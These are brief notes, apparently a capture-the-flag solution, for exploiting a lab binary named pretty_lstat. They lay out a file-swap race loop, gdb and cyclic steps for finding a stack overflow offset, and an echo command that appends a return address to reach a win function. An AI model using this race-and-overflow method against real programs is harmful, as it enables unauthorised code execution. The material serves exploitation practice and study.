# Create a script that will change the name of three files. 
# while true; do cp hello.txt data.txt; cp exploit.txt data.txt; done
# Run it and run the program with data.txt as argument (or the name file that will be repleced)

# Or use gdb with the normal data. Put a breakpoint after the stack for the file has been allocated. 
# Copy the content of exploit file in prevoius file and overflow.
# cp exploit.txt data.txt while on breakpoint
# use cyclic to find the overflow and remove the extra bytes (looking the overflow from gdb)
# Then echo -ne "\x96\x12\x40\x00\x00\x00\x00\x00" >> exploit.txt and xxd exploit.txt
# This will execute the win function and print the flag
# while true;do ./pretty_lstat data.txt; done to execute the program 
# and then use the initila script in different terminal
